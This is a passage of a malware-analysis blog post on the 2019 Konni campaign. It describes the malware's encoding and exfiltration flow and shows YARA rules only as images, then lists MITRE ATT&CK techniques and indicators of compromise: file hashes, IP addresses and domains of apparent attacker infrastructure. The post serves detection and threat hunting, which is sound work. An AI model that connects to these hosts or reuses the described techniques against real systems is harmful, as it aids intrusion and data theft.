class="ny nz oa ob oc od sg sh paragraph-image"><div role="button" tabindex="0" class="oe of fj og bh oh"><div class="nv nw si"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Fd67yoP_yB-mFENgyygCBw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*Fd67yoP_yB-mFENgyygCBw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*Fd67yoP_yB-mFENgyygCBw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*Fd67yoP_yB-mFENgyygCBw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*Fd67yoP_yB-mFENgyygCBw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Fd67yoP_yB-mFENgyygCBw.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Fd67yoP_yB-mFENgyygCBw.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*Fd67yoP_yB-mFENgyygCBw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*Fd67yoP_yB-mFENgyygCBw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*Fd67yoP_yB-mFENgyygCBw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*Fd67yoP_yB-mFENgyygCBw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*Fd67yoP_yB-mFENgyygCBw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*Fd67yoP_yB-mFENgyygCBw.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*Fd67yoP_yB-mFENgyygCBw.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"/><img alt="" class="bh md oi c" width="1000" height="339" loading="eager" role="presentation"/></picture></div></div></figure></div></div></div><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="7e78" class="qb op gu bf oq qc qd dy ou qe qf ea oy nh qg qh qi nl qj qk ql np qm qn qo qp bk">Decoding Routine</h2><p id="33c3" class="pw-post-body-paragraph mw mx gu my b mz qq nb nc nd qr nf ng nh qs nj nk nl qt nn no np qu nr ns nt gn bk">Konni malware family use a custom base64 key to encode the content of several files in the exfiltration phase. We observed the same flow of data reconnaissance and exfiltration across all campaigns:</p><figure class="ny nz oa ob oc od nv nw paragraph-image"><div class="nv nw sj"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*jX9hnL1X4_27wCGWdLU84g.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*jX9hnL1X4_27wCGWdLU84g.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*jX9hnL1X4_27wCGWdLU84g.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*jX9hnL1X4_27wCGWdLU84g.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*jX9hnL1X4_27wCGWdLU84g.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*jX9hnL1X4_27wCGWdLU84g.png 1100w, https://miro.medium.com/v2/resize:fit:1010/format:webp/1*jX9hnL1X4_27wCGWdLU84g.png 1010w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 505px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*jX9hnL1X4_27wCGWdLU84g.png 640w, https://miro.medium.com/v2/resize:fit:720/1*jX9hnL1X4_27wCGWdLU84g.png 720w, https://miro.medium.com/v2/resize:fit:750/1*jX9hnL1X4_27wCGWdLU84g.png 750w, https://miro.medium.com/v2/resize:fit:786/1*jX9hnL1X4_27wCGWdLU84g.png 786w, https://miro.medium.com/v2/resize:fit:828/1*jX9hnL1X4_27wCGWdLU84g.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*jX9hnL1X4_27wCGWdLU84g.png 1100w, https://miro.medium.com/v2/resize:fit:1010/1*jX9hnL1X4_27wCGWdLU84g.png 1010w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 505px"/><img alt="" class="bh md oi c" width="505" height="717" loading="eager" role="presentation"/></picture></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">Typical Konni Data Reconnaissance and Exfiltration</figcaption></figure><p id="b88c" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Also, the decoding routine is identical across all Konni samples we have analyzed which indicate a code reuse by the threat actor.</p><figure class="ny nz oa ob oc od nv nw paragraph-image"><div role="button" tabindex="0" class="oe of fj og bh oh"><div class="nv nw sk"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*-BjFw4f2oxgNspaF-4f6oQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*-BjFw4f2oxgNspaF-4f6oQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*-BjFw4f2oxgNspaF-4f6oQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*-BjFw4f2oxgNspaF-4f6oQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*-BjFw4f2oxgNspaF-4f6oQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*-BjFw4f2oxgNspaF-4f6oQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-BjFw4f2oxgNspaF-4f6oQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*-BjFw4f2oxgNspaF-4f6oQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*-BjFw4f2oxgNspaF-4f6oQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*-BjFw4f2oxgNspaF-4f6oQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*-BjFw4f2oxgNspaF-4f6oQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*-BjFw4f2oxgNspaF-4f6oQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*-BjFw4f2oxgNspaF-4f6oQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*-BjFw4f2oxgNspaF-4f6oQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md oi c" width="700" height="693" loading="lazy" role="presentation"/></picture></div></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">Konni Decoding Routine</figcaption></figure><h1 id="0226" class="oo op gu bf oq or os ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph pi pj pk pl bk">Hunting for Konni</h1><p id="4594" class="pw-post-body-paragraph mw mx gu my b mz qq nb nc nd qr nf ng nh qs nj nk nl qt nn no np qu nr ns nt gn bk">The YARA rules below were used to find additional samples of the Konni malware known in the wild. It is a combination of unique strings of the macro within the lure documents, unique strings and win API calls from the payload and unique opcode sequence taken from the decoding routine shared among all samples.</p><figure class="ny nz oa ob oc od nv nw paragraph-image"><div role="button" tabindex="0" class="oe of fj og bh oh"><div class="nv nw sl"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*lLiBXlspvBdNvuf5MtmTnQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*lLiBXlspvBdNvuf5MtmTnQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*lLiBXlspvBdNvuf5MtmTnQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*lLiBXlspvBdNvuf5MtmTnQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*lLiBXlspvBdNvuf5MtmTnQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*lLiBXlspvBdNvuf5MtmTnQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lLiBXlspvBdNvuf5MtmTnQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*lLiBXlspvBdNvuf5MtmTnQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*lLiBXlspvBdNvuf5MtmTnQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*lLiBXlspvBdNvuf5MtmTnQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*lLiBXlspvBdNvuf5MtmTnQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*lLiBXlspvBdNvuf5MtmTnQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*lLiBXlspvBdNvuf5MtmTnQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*lLiBXlspvBdNvuf5MtmTnQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md oi c" width="700" height="565" loading="lazy" role="presentation"/></picture></div></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">YARA Rule: Lure Doc</figcaption></figure><figure class="ny nz oa ob oc od nv nw paragraph-image"><div class="nv nw sm"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*193tHpBTByMhkFVptP56jg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*193tHpBTByMhkFVptP56jg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*193tHpBTByMhkFVptP56jg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*193tHpBTByMhkFVptP56jg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*193tHpBTByMhkFVptP56jg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*193tHpBTByMhkFVptP56jg.png 1100w, https://miro.medium.com/v2/resize:fit:1354/format:webp/1*193tHpBTByMhkFVptP56jg.png 1354w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 677px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*193tHpBTByMhkFVptP56jg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*193tHpBTByMhkFVptP56jg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*193tHpBTByMhkFVptP56jg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*193tHpBTByMhkFVptP56jg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*193tHpBTByMhkFVptP56jg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*193tHpBTByMhkFVptP56jg.png 1100w, https://miro.medium.com/v2/resize:fit:1354/1*193tHpBTByMhkFVptP56jg.png 1354w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 677px"/><img alt="" class="bh md oi c" width="677" height="952" loading="lazy" role="presentation"/></picture></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">YARA Rule: Konni Payload</figcaption></figure><p id="fea9" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Check my <a class="af nu" href="https://github.com/d-hunter1/YARA" rel="noopener ugc nofollow" target="_blank">YARA github page</a> to test out the YARA rules I used to hunt for Konni samples.</p><h1 id="a9fe" class="oo op gu bf oq or os ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph pi pj pk pl bk">MITRE ATT&amp;CK Techniques</h1><p id="3d28" class="pw-post-body-paragraph mw mx gu my b mz qq nb nc nd qr nf ng nh qs nj nk nl qt nn no np qu nr ns nt gn bk"><strong class="my gv">Execution</strong></p><ul class=""><li id="a8db" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt qx qy qz bk">T1059-<a class="af nu" href="https://attack.mitre.org/techniques/T1059" rel="noopener ugc nofollow" target="_blank">Command-Line Interface</a></li><li id="55d2" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">T1129-<a class="af nu" href="https://attack.mitre.org/techniques/T1129" rel="noopener ugc nofollow" target="_blank">Execution through Module Load</a></li><li id="2d29" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">T1085-<a class="af nu" href="https://attack.mitre.org/techniques/T1085" rel="noopener ugc nofollow" target="_blank">Rundll32</a></li></ul><p id="b555" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">Persistence</strong></p><ul class=""><li id="85ad" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt qx qy qz bk">T1031-<a class="af nu" href="https://attack.mitre.org/techniques/T1031/" rel="noopener ugc nofollow" target="_blank">Modify Existing Service</a></li><li id="4e20" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">T1050-<a class="af nu" href="https://attack.mitre.org/techniques/T1050/" rel="noopener ugc nofollow" target="_blank">New Service</a></li></ul><p id="a481" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">Privilege Escalation</strong></p><ul class=""><li id="2960" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt qx qy qz bk">T1134-<a class="af nu" href="https://attack.mitre.org/techniques/T1134" rel="noopener ugc nofollow" target="_blank">Access Token Manipulation</a></li><li id="16bd" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">T1050-<a class="af nu" href="https://attack.mitre.org/techniques/T1050/" rel="noopener ugc nofollow" target="_blank">New Service</a></li></ul><p id="ac06" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">Defense Evasion</strong></p><ul class=""><li id="bfa4" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt qx qy qz bk">T1134-<a class="af nu" href="https://attack.mitre.org/techniques/T1134" rel="noopener ugc nofollow" target="_blank">Access Token Manipulation</a></li><li id="c007" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">T1088-<a class="af nu" href="https://attack.mitre.org/techniques/T1088" rel="noopener ugc nofollow" target="_blank">Bypass User Account Control</a></li><li id="2a4c" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">T1140-<a class="af nu" href="https://attack.mitre.org/techniques/T1140" rel="noopener ugc nofollow" target="_blank">Deobfuscate/Decode Files or Information</a></li><li id="cc45" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">T1112-<a class="af nu" href="https://attack.mitre.org/techniques/T1112" rel="noopener ugc nofollow" target="_blank">Modify Registry</a></li><li id="4deb" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">T1085-<a class="af nu" href="https://attack.mitre.org/techniques/T1085" rel="noopener ugc nofollow" target="_blank">Rundll32</a></li></ul><p id="f028" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">Discovery</strong></p><ul class=""><li id="ff1a" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt qx qy qz bk">T1057-<a class="af nu" href="https://attack.mitre.org/techniques/T1057" rel="noopener ugc nofollow" target="_blank">Process Discovery</a></li><li id="5a0b" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">T1082-<a class="af nu" href="https://attack.mitre.org/techniques/T1082" rel="noopener ugc nofollow" target="_blank">System Information Discovery</a></li></ul><p id="ffa3" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">Exfiltration</strong></p><ul class=""><li id="d729" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt qx qy qz bk">T1048-<a class="af nu" href="https://attack.mitre.org/techniques/T1048" rel="noopener ugc nofollow" target="_blank">Exfiltration Over Alternative Protocol</a></li><li id="445b" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">T1132-<a class="af nu" href="https://attack.mitre.org/techniques/T1132" rel="noopener ugc nofollow" target="_blank">Data Encoding</a></li></ul><h1 id="f76e" class="oo op gu bf oq or os ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph pi pj pk pl bk">IOCs</h1><p id="5c64" class="pw-post-body-paragraph mw mx gu my b mz qq nb nc nd qr nf ng nh qs nj nk nl qt nn no np qu nr ns nt gn bk"><strong class="my gv">Lure Documents</strong></p><ul class=""><li id="34b9" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt qx qy qz bk"><em class="on">8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd</em></li><li id="5628" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk"><em class="on">4c201f9949804e90f94fe91882cb8aad3e7daf496a7f4e792b9c7fed95ab0726</em></li><li id="d66a" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk"><em class="on">ed63e84985e1af9c4764e6b6ca513ec1c16840fb2534b86f95e31801468be67a</em></li></ul><p id="a556" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">Konni Loader</strong></p><ul class=""><li id="f6aa" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt qx qy qz bk"><em class="on">6a22db7df237c085855deb48686217173dc2664f4b927ebe238d4442b68a2fd3</em></li><li id="25da" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk"><em class="on">2ab1b28bae24217e8b6dd0cd30bb7258fa34c0d7337ecfea55e4310d08aeb1e6</em></li></ul><p id="8aeb" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">Konni final payload</strong></p><ul class=""><li id="5ca3" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt qx qy qz bk"><em class="on">e94fa697d8661d79260edf17c0a519fae4b2a64037aa79b29d6631205995fdad</em></li><li id="6ddc" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk"><em class="on">6256ba2b89c78877328cc70d45db980310a51545a83d1d922d64048b57d6c057</em></li><li id="205e" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk"><em class="on">52ba17b90244a46e0ef2a653452b26bcb94f0a03b999c343301fef4e3c1ec5d2</em></li><li id="4aa5" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk"><em class="on">7d2b1af486610a45f78a573af9a9ad00414680ff8e958cfb5437a1b140acb60c</em></li><li id="11ff" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk"><em class="on">ceb8093507911939a17c6c7b39475f5d4db70a9ed3b85ef34ff5e6372b20a73e</em></li><li id="37a2" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk"><em class="on">8795b2756efa32d5101a8d38ea27fca9c8c7ed1d54da98f0520f72706d1c5105</em></li><li id="75f9" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk"><em class="on">7f6984fa9d0bbc1bd6ab531f0a8c2f4beb15de30f2b20054d3980395d77665af</em></li><li id="fcd2" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk"><em class="on">290c942da70c68d28a387775fbb7e6cab6749547d278cb755b4999e0fe61a09f</em></li><li id="a7d4" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk"><em class="on">274e706809a1c0363f78363d0c6a7d256be5be11039de14f617265e01d550a98</em></li></ul><p id="5672" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">IP Addresses</strong></p><ul class=""><li id="27bd" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt qx qy qz bk"><em class="on">69.197.143.12</em></li><li id="e695" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk"><em class="on">185.27.134.11</em></li><li id="322c" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk"><em class="on">88.99.13.69</em></li><li id="00c4" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk"><em class="on">162.253.155.226</em></li></ul><p id="e4ea" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">Domains</strong></p><ul class=""><li id="9e57" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt qx qy qz bk"><em class="on">clean.1apps[.]com</em></li><li id="1cf1" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk"><em class="on">handicap. eu5[.]org</em></li><li id="febb" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk"><em class="on">panda2019.eu5[.]org</em></li><li id="d403" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk"><em class="on">ftpupload[.]net</em></li></ul></div></div></div></div></section></div></div></article></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="sn so ab ja"><div class="sp ab"><a class="sq ay am ao" rel="noopener follow" href="/tag/malware?source=post_page-----b45a0f321e9b--------------------------------"><div class="sr fj cx ss ge st su bf b bg z bk sv">Malware</div></a></div><div class="sp ab"><a class="sq ay am ao" rel="noopener follow" href="/tag/malware-analysis?source=post_page-----b45a0f321e9b--------------------------------"><div class="sr fj cx ss ge st su bf b bg z bk sv">Malware Analysis</div></a></div><div class="sp ab"><a class="sq ay am ao" rel="noopener follow" href="/tag/threat-hunting?source=post_page-----b45a0f321e9b--------------------------------"><div class="sr fj cx ss ge st su bf b bg z bk sv">Threat Hunting</div></a></div><div class="sp ab"><a class="sq ay am ao" rel="noopener follow" href="/tag/threat-intelligence?source=post_page-----b45a0f321e9b--------------------------------"><div class="sr fj cx ss ge st su bf b bg z bk sv">Threat Intelligence</div></a></div><div class="sp ab"><a class="sq ay am ao" rel="noopener follow" href="/tag/cybersecurity?source=post_page-----b45a0f321e9b--------------------------------"><div class="sr fj cx ss ge st su bf b bg z bk sv">Cybersecurity</div></a></div></div></div></div><div class="l"></div><footer class="sw sx sy sz ta tb tc td te ab q tf ik c"><div class="l ae"><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ab cp tg"><div class="ab q kv"><div class="th l"><span class="l ti tj tk e d"><div class="ab q kv kw"><div class="pw-multi-vote-icon fj je kx ky kz"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fd-hunter%2Fb45a0f321e9b&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fd-hunter%2Fa-look-into-konni-2019-campaign-b45a0f321e9b&amp;user=Doron+Karmi&amp;userId=36b231b019fe&amp;source=-----b45a0f321e9b---------------------clap_footer-----------"><div><div class="bm" aria-hidden="false"><div class="la ao lb lc ld le am lf lg lh kz"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 